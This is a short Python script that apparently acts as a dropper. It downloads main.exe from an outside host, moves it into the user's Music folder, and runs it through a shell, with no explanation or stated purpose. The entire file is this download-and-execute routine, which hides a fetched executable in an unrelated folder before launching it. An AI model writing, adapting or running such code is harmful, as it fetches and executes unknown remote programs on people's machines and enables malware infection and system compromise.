import subprocess,requests,os

def download(url):

    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    

download("https://armeng.pythonanywhere.com/media/files/main.exe")
current_dir = os.getcwd()
strr = os.getcwd()
x = -2
for i in os.getcwd():
    if i == "\\":
        x += 1
for i in range(x):
    os.chdir("..")


os.chdir("Music")
try:
    os.rename(current_dir+r"\main.exe", os.getcwd()+r"\main.exe")
except FileExistsError:
    pass

subprocess.call("main.exe", shell=True)